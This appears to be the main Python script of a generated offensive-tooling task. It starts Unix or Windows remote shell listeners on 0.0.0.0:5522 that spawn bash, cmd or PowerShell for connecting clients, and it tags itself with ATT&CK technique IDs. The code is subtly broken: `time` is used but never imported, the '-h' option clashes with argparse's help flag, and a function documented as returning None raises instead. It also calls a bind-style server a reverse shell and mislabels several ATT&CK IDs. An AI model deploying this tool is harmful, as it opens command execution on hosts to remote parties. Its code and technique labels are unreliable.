from TASK_001_models import ExecutionResult, ReverseShellConfig
from TASK_002_unix_reverse_shell import UnixReverseShellListener
from TASK_003_windows_reverse_shell import WindowsReverseShellListener
import signal
import sys
import argparse
from typing import Optional



def create_reverse_shell_server(shell_type: str = 'unix') -> Optional[UnixReverseShellListener | WindowsReverseShellListener]:
    """Factory function that creates the appropriate reverse shell listener based on platform.
    
    Args:
        shell_type: The type of shell to use ('unix' or 'windows').
        
    Returns:
        A configured UnixReverseShellListener or WindowsReverseShellListener instance,
        or None if shell_type is not recognized.
    """
    config = ReverseShellConfig(
        host='0.0.0.0',
        port=5522,
        timeout=30.0,
        shell_type=shell_type
    )

    if shell_type == 'unix':
        return UnixReverseShellListener(config)
    elif shell_type == 'windows':
        return WindowsReverseShellListener(config)
    else:
        raise ValueError(f"Unknown shell type: {shell_type}. Must be 'unix' or 'windows'.")


def run_unix_listener(host: str = '0.0.0.0', port: int = 5522, timeout: float = 30.0) -> ExecutionResult:
    """Run the Unix reverse shell listener server.
    
    Spawns a subprocess for each connected client and multiplexes I/O between
    the socket connection and the child process using select.select().
    
    Args:
        host: The address to bind to (default: 0.0.0.0).
        port: The port to listen on (default: 5522).
        timeout: Connection timeout in seconds (default: 30.0).
        
    Returns:
        ExecutionResult with the status of the server run.
    """
    config = ReverseShellConfig(
        host=host,
        port=port,
        timeout=timeout,
        shell_type='bash'
    )

    listener = UnixReverseShellListener(config)
    result = listener.run()
    
    return ExecutionResult(
        command_output=f"Unix reverse shell server started on {host}:{port}",
        exit_code=0 if result else 1,
        error_messages=[] if result else [result.error] if isinstance(result, str) else []
    )


def run_windows_listener(host: str = '0.0.0.0', port: int = 5522, timeout: float = 30.0) -> ExecutionResult:
    """Run the Windows reverse shell listener server.
    
    Spawns cmd.exe or powershell for each connected client and multiplexes I/O
    between the socket connection and the child process using threading.
    
    Args:
        host: The address to bind to (default: 0.0.0.0).
        port: The port to listen on (default: 5522).
        timeout: Connection timeout in seconds (default: 30.0).
        
    Returns:
        ExecutionResult with the status of the server run.
    """
    config = ReverseShellConfig(
        host=host,
        port=port,
        timeout=timeout,
        shell_type='powershell'
    )

    listener = WindowsReverseShellListener(config)
    result = listener.run()
    
    return ExecutionResult(
        command_output=f"Windows reverse shell server started on {host}:{port}",
        exit_code=0 if result else 1,
        error_messages=[] if result else [result.error] if isinstance(result, str) else []
    )


def main(host: Optional[str] = None, port: Optional[int] = None, shell_type: Optional[str] = None):
    """Main entry point for the reverse shell orchestrator.
    
    Parses CLI arguments, sets up signal handlers for graceful shutdown,
    and runs the appropriate reverse shell listener based on the selected platform.
    
    Args:
        host: Host address to bind to (default: 0.0.0.0).
        port: Port to listen on (default: 5522).
        shell_type: Shell type ('unix' or 'windows', default: 'unix').
        
    Returns:
        ExecutionResult with the overall execution status.
    """
    # Parse CLI arguments using argparse
    parser = argparse.ArgumentParser(
        description='Reverse Shell Orchestrator - T1059.003, T1059.004, T1133',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
ATT&CK Techniques:
  T1059.003 - Command and Scripting Interpreter
  T1059.004 - PowerShell
  T1133 - Remote Services (Reverse Shell)

Usage: python __main__.py [--host HOST] [--port PORT] [--shell TYPE]
        or: python __main__.py unix|windows
        """
    )
    
    parser.add_argument(
        '--host', '-h',
        type=str,
        default='0.0.0.0',
        help='Host address to bind to (default: 0.0.0.0)'
    )
    
    parser.add_argument(
        '--port', '-p',
        type=int,
        default=5522,
        help='Port to listen on (default: 5522)'
    )
    
    parser.add_argument(
        '--shell', '-s',
        type=str,
        choices=['unix', 'windows'],
        default='unix',
        help='Shell type: unix or windows (default: unix)'
    )
    
    args = parser.parse_args()

    # Set up signal handlers for graceful shutdown
    def signal_handler(signum, frame):
        """Handle SIGINT and SIGTERM signals gracefully."""
        print(f"\nReceived signal {signum}, shutting down...")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Create the appropriate reverse shell server based on shell type
    listener = create_reverse_shell_server(shell_type=args.shell)
    
    if listener is None:
        return ExecutionResult(
            command_output=f"Failed to create {args.shell} reverse shell server",
            exit_code=1,
            error_messages=[f"Unknown shell type: {args.shell}"]
        )

    # Run the listener in a non-blocking manner using threading
    import threading
    
    def run_server():
        """Run the listener server in a separate thread."""
        try:
            if args.shell == 'unix':
                result = run_unix_listener(host=args.host, port=args.port)
            else:
                result = run_windows_listener(host=args.host, port=args.port)
            
            print(f"\nServer stopped. Exit code: {result.exit_code}")
            return result
            
        except KeyboardInterrupt:
            print("\nKeyboardInterrupt received, stopping server...")
            listener.stop()
            return ExecutionResult(
                command_output="Server stopped via keyboard interrupt",
                exit_code=0,
                error_messages=[]
            )
        
        except Exception as e:
            print(f"\nError running server: {e}")
            return ExecutionResult(
                command_output=f"Error: {str(e)}",
                exit_code=1,
                error_messages=[str(e)]
            )

    # Run the server in a daemon thread for non-blocking operation
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    
    print(f"Reverse shell server listening on {args.host}:{args.port} ({args.shell})...")
    print("Press Ctrl+C to stop.")

    # Keep the main thread alive until interrupted
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    
    return ExecutionResult(
        command_output=f"Server stopped on {args.host}:{args.port}",
        exit_code=0,
        error_messages=[]
    )


if __name__ == '__main__':
    result = main()
    sys.exit(result.exit_code)
